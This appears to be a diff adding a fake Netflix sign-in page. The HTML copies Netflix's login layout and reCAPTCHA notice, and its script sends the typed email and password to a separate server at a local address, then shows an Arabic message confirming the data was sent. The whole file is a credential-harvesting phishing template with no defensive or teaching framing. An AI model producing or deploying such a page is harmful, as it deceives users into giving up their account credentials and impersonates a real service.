@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Netflix Sign In</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <div class="overlay"></div>
+
+  <div class="login-container">
+    <h1>Sign In</h1>
+    <input type="text" id="email" placeholder="Email or mobile number">
+    <input type="password" id="password" placeholder="Password">
+    <button class="login-btn" onclick="handleLogin()">Sign In</button>
+
+    <div class="divider">OR</div>
+    <button class="code-btn">Use a Sign-In Code</button>
+
+    <div class="extra-links">
+      <a href="#" class="forgot">Forgot password?</a>
+    </div>
+
+    <div class="options">
+      <label><input type="checkbox" checked> Remember me</label>
+    </div>
+
+    <div class="signup">
+      <span>New to Netflix?</span> <a href="#">Sign up now.</a>
+    </div>
+
+    <div class="disclaimer">
+      <small>This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more.</a></small>
+    </div>
+  </div>
+
+  <script>
+    function handleLogin() {
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      fetch('http://127.0.0.1:5000/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password })
+      })
+      .then(response => response.json())
+      .then(data => {
+        alert('تم إرسال البيانات للسيرفر بنجاح!');
+        console.log(data);
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert('في مشكلة في الإرسال');
+      });
+    }
+  </script>
+
+</body>
+</html>
